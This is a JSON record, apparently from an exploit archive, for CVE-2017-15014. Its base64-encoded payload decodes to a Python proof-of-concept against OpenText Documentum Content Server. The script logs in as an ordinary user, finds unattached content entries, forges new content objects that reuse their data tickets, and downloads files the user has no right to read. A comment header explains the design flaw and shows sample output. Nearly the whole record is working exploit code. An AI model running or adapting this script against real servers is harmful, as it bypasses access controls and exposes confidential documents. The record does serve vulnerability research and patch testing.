{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgT3BlbnRleHQgRG9jdW1lbnR1bSBDb250ZW50IFNlcnZlciAoZm9ybWVybHkga25vd24gYXMgRU1DIERvY3VtZW50dW0gQ29udGVudCBTZXJ2ZXIpDQojIGNvbnRhaW5zIGZvbGxvd2luZyBkZXNpZ24gZ2FwLCB3aGljaCBhbGxvd3MgYXV0aGVudGljYXRlZCB1c2VyIHRvIGRvd25sb2FkIGFyYml0cmFyeQ0KIyBjb250ZW50IGZpbGVzIHJlZ2FyZGxlc3MgYXR0YWNrZXIncyByZXBvc2l0b3J5IHBlcm1pc3Npb25zOg0KIw0KIyB3aGVuIGF1dGhlbnRpY2F0ZWQgdXNlciB1cGxvYWQgY29udGVudCB0byByZXBvc2l0b3J5IGhlIHBlcmZvcm1zIGZvbGxvd2luZyBzdGVwczoNCiMgLSBjYWxscyBTVEFSVF9QVVNIIFJQQy1jb21tYW5kDQojIC0gdXBsb2FkcyBmaWxlIHRvIGNvbnRlbnQgc2VydmVyDQojIC0gY2FsbHMgRU5EX1BVU0hfVjIgUlBDLWNvbW1hbmQsIGhlcmUgQ29udGVudCBTZXJ2ZXIgcmV0dXJucyBEQVRBX1RJQ0tFVCwNCiMgICAgcHVycG9zZWQgdG8gaWRlbnRpZnkgdGhlIGxvY2F0aW9uIG9mIHRoZSB1cGxvYWRlZCBmaWxlIG9uIENvbnRlbnQgU2VydmVyIGZpbGVzeXN0ZW0NCiMgLSBmdXJ0aGVyIHVzZXIgY3JlYXRlcyBkbXJfY29udGVudCBvYmplY3QgaW4gcmVwb3NpdG9yeSwgd2hpY2ggaGFzIHZhbHVlIG9mIGRhdGFfdGlja2V0IGVxdWFsDQojICAgIHRvIHRoZSB2YWx1ZSBvZiBEQVRBX1RJQ0tFVCByZXR1cm5lZCBhdCB0aGUgZW5kIG9mIEVORF9QVVNIX1YyIGNhbGwNCiMNCiMgQXMgdGhlIHJlc3VsdCBvZiBzdWNoIGRlc2lnbiBhbnkgYXV0aGVudGljYXRlZCB1c2VyIG1heSBjcmVhdGUgaGlzIG93biBkbXJfY29udGVudCBvYmplY3QsDQojIHBvaW50aW5nIHRvIGFscmVhZHkgZXhpc3RpbmcgY29udGVudCBvZiBDb250ZW50IFNlcnZlciBmaWxlc3lzdGVtDQojDQojIFRoZSBQb0MgYmVsb3cgZGVtb25zdHJhdGVzIHRoaXMgdnVsbmVyYWJpbGl0eToNCiMNCiMgTWFjQm9vay1Qcm86fiAkIHB5dGhvbiBDVkUtMjAxNy0xNTAxNC5weQ0KIyB1c2FnZToNCiMgQ1ZFLTIwMTctMTUwMTQucHkgaG9zdCBwb3J0IHVzZXIgcGFzc3dvcmQNCiMgTWFjQm9vay1Qcm86fiAkIHB5dGhvbiBDVkUtMjAxNy0xNTAxNC5weSBkb2N1NzJkZXYwMSAxMDAwMSBkbV9ib2ZfcmVnaXN0cnkgZG1fYm9mX3JlZ2lzdHJ5DQojIFRyeWluZyB0byBjb25uZWN0IHRvIGRvY3U3MmRldjAxOjEwMDAxIGFzIGRtX2JvZl9yZWdpc3RyeSAuLi4NCiMgQ29ubmVjdGVkIHRvIGRvY3U3MmRldjAxOjEwMDAxLCBkb2NiYXNlOiBEQ1RNX0RFViwgdmVyc2lvbjogNy4yLjAyNzAuMDM3NyAgTGludXg2NC5PcmFjbGUNCiMgVHJ5aW5nIHRvIGZpbmQgYW55IG9iamVjdCB3aXRoIGNvbnRlbnQuLi4NCiMgUXVlcnlpbmcgImluYWNjZXNzaWJsZSIgZG1yX2NvbnRlbnQgb2JqZWN0cy4uLg0KIyBEb3dubG9hZGVkIDM5NTkvMzk1OSBieXRlcyBvZiBvYmplY3QgMDYwMjRiZTk4MDAwMDEzMw0KIyBEb3dubG9hZGVkIDExMjgwLzExMjgwIGJ5dGVzIG9mIG9iamVjdCAwNjAyNGJlOTgwMDAwMTM1DQojIERvd25sb2FkZWQgMTAwMDQvMTAwMDQgYnl0ZXMgb2Ygb2JqZWN0IDA2MDI0YmU5ODAwMDAxMzgNCiMgRG93bmxvYWRlZCAyMzY5Mi8yMzY5MiBieXRlcyBvZiBvYmplY3QgMDYwMjRiZTk4MDAwMDE3YQ0KIyBEb3dubG9hZGVkIDE5NTQxLzE5NTQxIGJ5dGVzIG9mIG9iamVjdCAwNjAyNGJlOTgwMDAwMTgwDQojIERvd25sb2FkZWQgMTA5Ni8xMDk2IGJ5dGVzIG9mIG9iamVjdCAwNjAyNGJlOTgwMDAwMTcyDQojIERvd25sb2FkZWQgMTE3NzYvMTE3NzYgYnl0ZXMgb2Ygb2JqZWN0IDA2MDI0YmU5ODAwMDAxMWYNCiMgRG93bmxvYWRlZCA1MDE3Ni81MDE3NiBieXRlcyBvZiBvYmplY3QgMDYwMjRiZTk4MDAwMDEyNQ0KIyBEb3dubG9hZGVkIDE2Mzg0LzE2Mzg0IGJ5dGVzIG9mIG9iamVjdCAwNjAyNGJlOTgwMDAwMTJmDQojIERvd25sb2FkZWQgOTg1Lzk4NSBieXRlcyBvZiBvYmplY3QgMDYwMjRiZTk4MDAwMDFmNQ0KIyBEb3dubG9hZGVkIDE5MS8xOTEgYnl0ZXMgb2Ygb2JqZWN0IDA2MDI0YmU5ODAwMDAxZmUNCiMgRG93bmxvYWRlZCAyMTMvMjEzIGJ5dGVzIG9mIG9iamVjdCAwNjAyNGJlOTgwMDAwMjAwDQojDQoNCg0KDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc3lzDQoNCmZyb20gZGN0bXB5IGltcG9ydCBOVUxMX0lEDQoNCmZyb20gZGN0bXB5LmRvY2Jhc2VjbGllbnQgaW1wb3J0IERvY2Jhc2VDbGllbnQNCmZyb20gZGN0bXB5Lm9iai50eXBlZG9iamVjdCBpbXBvcnQgVHlwZWRPYmplY3QNCg0KQ0lQSEVSUyA9ICJBTEw6YU5VTEw6IWVOVUxMIg0KDQoNCmRlZiB1c2FnZSgpOg0KICAgIHByaW50ICJ1c2FnZTpcbiVzIGhvc3QgcG9ydCB1c2VyIHBhc3N3b3JkIiAlIHN5cy5hcmd2WzBdDQoNCg0KZGVmIG1haW4oKToNCiAgICBpZiBsZW4oc3lzLmFyZ3YpICE9IDU6DQogICAgICAgIHVzYWdlKCkNCiAgICAgICAgZXhpdCgxKQ0KDQogICAgKHNlc3Npb24sIGRvY2Jhc2UpID0gY3JlYXRlX3Nlc3Npb24oKnN5cy5hcmd2WzE6NV0pDQoNCiAgICBpZiBpc19zdXBlcl91c2VyKHNlc3Npb24pOg0KICAgICAgICBwcmludCAiQ3VycmVudCB1c2VyIGlzIGEgc3VwZXJ1c2VyLCBub3RoaW5nIHRvIGRvIg0KICAgICAgICBleGl0KDEpDQoNCiAgICBwcmludCAiVHJ5aW5nIHRvIGZpbmQgYW55IG9iamVjdCB3aXRoIGNvbnRlbnQuLi4iDQogICAgb2JqZWN0X2lkID0gc2Vzc2lvbi5xdWVyeSgNCiAgICAgICAgIlNFTEVDVCBGT1IgUkVBRCByX29iamVjdF9pZCAiDQogICAgICAgICJGUk9NIGRtX3N5c29iamVjdCBXSEVSRSByX2NvbnRlbnRfc2l6ZT4wIikgXA0KICAgICAgICAubmV4dF9yZWNvcmQoKVsncl9vYmplY3RfaWQnXQ0KICAgIHNlc3Npb24uYXBwbHkoTm9uZSwgTlVMTF9JRCwgIkJFR0lOX1RSQU5TIikNCiAgICBwcmludCAiUXVlcnlpbmcgXCJpbmFjY2Vzc2libGVcIiBkbXJfY29udGVudCBvYmplY3RzLi4uIg0KICAgIGZvciBlIGluIHNlc3Npb24ucXVlcnkoDQogICAgICAgICAgICAiU0VMRUNUICogRlJPTSBkbXJfY29udGVudCAiDQogICAgICAgICAgICAiV0hFUkUgQU5ZIHBhcmVudF9pZCBJUyBOT1QgTlVMTElEICINCiAgICAgICAgICAgICJBTkQgQU5ZIHBhcmVudF9pZCBOT1QgSU4gIg0KICAgICAgICAgICAgIihTRUxFQ1Qgcl9vYmplY3RfaWQgRlJPTSBkbV9zeXNvYmplY3QpIg0KICAgICk6DQogICAgICAgIGhhbmRsZSA9IDANCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29udGVudF9pZCA9IHNlc3Npb24ubmV4dF9pZCgweDA2KQ0KICAgICAgICAgICAgb2JqID0gVHlwZWRPYmplY3Qoc2Vzc2lvbj1zZXNzaW9uKQ0KICAgICAgICAgICAgb2JqLnNldF9zdHJpbmcoIk9CSkVDVF9UWVBFIiwgImRtcl9jb250ZW50IikNCiAgICAgICAgICAgIG9iai5zZXRfYm9vbCgiSVNfTkVXX09CSkVDVCIsIFRydWUpDQogICAgICAgICAgICBvYmouc2V0X2ludCgiaV92c3RhbXAiLCAwKQ0KICAgICAgICAgICAgb2JqLnNldF9pZCgic3RvcmFnZV9pZCIsIGVbInN0b3JhZ2VfaWQiXSkNCiAgICAgICAgICAgIG9iai5zZXRfaWQoImZvcm1hdCIsIGVbImZvcm1hdCJdKQ0KICAgICAgICAgICAgb2JqLnNldF9pbnQoImRhdGFfdGlja2V0IiwgZVsiZGF0YV90aWNrZXQiXSkNCiAgICAgICAgICAgIG9iai5zZXRfaWQoInBhcmVudF9pZCIsIG9iamVjdF9pZCkNCiAgICAgICAgICAgIGlmIG5vdCBzZXNzaW9uLnNhdmVfY29udF9hdHRycyhjb250ZW50X2lkLCBvYmopOg0KICAgICAgICAgICAgICAgIHByaW50ICJGYWlsZWQiDQogICAgICAgICAgICAgICAgZXhpdCgxKQ0KDQogICAgICAgICAgICBoYW5kbGUgPSBzZXNzaW9uLm1ha2VfcHVsbGVyKA0KICAgICAgICAgICAgICAgIE5VTExfSUQsIG9ialsic3RvcmFnZV9pZCJdLCBjb250ZW50X2lkLA0KICAgICAgICAgICAgICAgIG9ialsiZm9ybWF0Il0sIG9ialsiZGF0YV90aWNrZXQiXQ0KICAgICAgICAgICAgKQ0KICAgICAgICAgICAgaWYgaGFuZGxlID09IDA6DQogICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJVbmFibGUgbWFrZSBwdWxsZXIiKQ0KICAgICAgICAgICAgc2l6ZSA9IDANCiAgICAgICAgICAgIGZvciBjaHVuayBpbiBzZXNzaW9uLmRvd25sb2FkKGhhbmRsZSk6DQogICAgICAgICAgICAgICAgc2l6ZSArPSBsZW4oY2h1bmspDQoNCiAgICAgICAgICAgIHByaW50ICJEb3dubG9hZGVkICVkLyVkIGJ5dGVzIG9mIG9iamVjdCAlcyIgJSBcDQogICAgICAgICAgICAgICAgICAoc2l6ZSwgZVsnZnVsbF9jb250ZW50X3NpemUnXSwgZVsncl9vYmplY3RfaWQnXSkNCiAgICAgICAgZmluYWxseToNCiAgICAgICAgICAgIGlmIGhhbmRsZSA+IDA6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmtpbGxfcHVsbGVyKGhhbmRsZSkNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KDQpkZWYgY3JlYXRlX3Nlc3Npb24oaG9zdCwgcG9ydCwgdXNlciwgcHdkKToNCiAgICBwcmludCAiVHJ5aW5nIHRvIGNvbm5lY3QgdG8gJXM6JXMgYXMgJXMgLi4uIiAlIChob3N0LCBwb3J0LCB1c2VyKQ0KICAgIHNlc3Npb24gPSBOb25lDQogICAgdHJ5Og0KICAgICAgICBzZXNzaW9uID0gRG9jYmFzZUNsaWVudCgNCiAgICAgICAgICAgIGhvc3Q9aG9zdCwgcG9ydD1pbnQocG9ydCksDQogICAgICAgICAgICB1c2VybmFtZT11c2VyLCBwYXNzd29yZD1wd2QpDQogICAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICAgICAgaWYgZS5lcnJubyA9PSA1NDoNCiAgICAgICAgICAgIHNlc3Npb24gPSBEb2NiYXNlQ2xpZW50KA0KICAgICAgICAgICAgICAgIGhvc3Q9aG9zdCwgcG9ydD1pbnQocG9ydCksDQogICAgICAgICAgICAgICAgdXNlcm5hbWU9dXNlciwgcGFzc3dvcmQ9cHdkLA0KICAgICAgICAgICAgICAgIHNlY3VyZT1UcnVlLCBjaXBoZXJzPUNJUEhFUlMpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByYWlzZSBlDQogICAgZG9jYmFzZSA9IHNlc3Npb24uZG9jYmFzZWNvbmZpZ1snb2JqZWN0X25hbWUnXQ0KICAgIHZlcnNpb24gPSBzZXNzaW9uLnNlcnZlcmNvbmZpZ1sncl9zZXJ2ZXJfdmVyc2lvbiddDQogICAgcHJpbnQgIkNvbm5lY3RlZCB0byAlczolcywgZG9jYmFzZTogJXMsIHZlcnNpb246ICVzIiAlIFwNCiAgICAgICAgICAoaG9zdCwgcG9ydCwgZG9jYmFzZSwgdmVyc2lvbikNCiAgICByZXR1cm4gKHNlc3Npb24sIGRvY2Jhc2UpDQoNCg0KZGVmIGlzX3N1cGVyX3VzZXIoc2Vzc2lvbik6DQogICAgdXNlciA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oImRtX3VzZXIgV0hFUkUgdXNlcl9uYW1lPVVTRVIiKQ0KICAgIGlmIHVzZXJbJ3VzZXJfcHJpdmlsZWdlcyddID09IDE2Og0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGdyb3VwID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigNCiAgICAgICAgImRtX2dyb3VwIHdoZXJlIGdyb3VwX25hbWU9J2RtX3N1cGVydXNlcnMnICINCiAgICAgICAgIkFORCBhbnkgaV9hbGxfdXNlcnNfbmFtZXM9VVNFUiIpDQogICAgaWYgZ3JvdXAgaXMgbm90IE5vbmU6DQogICAgICAgIHJldHVybiBUcnVlDQoNCiAgICByZXR1cm4gRmFsc2UNCg0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1haW4oKQ0K", 
    "filename": "platforms/multiple/webapps/43005.py", 
    "id": "43005", 
    "cves": [
        "CVE-2017-15014"
    ]
}